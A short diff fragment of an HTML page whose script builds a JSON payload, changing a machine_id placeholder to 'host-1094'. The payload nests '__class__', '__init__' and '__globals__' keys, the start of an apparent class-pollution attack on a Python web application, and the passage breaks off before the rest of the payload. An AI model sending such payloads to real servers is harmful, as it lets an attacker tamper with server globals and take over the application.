@@ -6,7 +6,7 @@
 <body>
     <script>
         const payload = {
-            "machine_id": "<MACHINE_ID>",
+            "machine_id": "host-1094",
             "__class__": {
                 "__init__": {
                     "__globals__": {
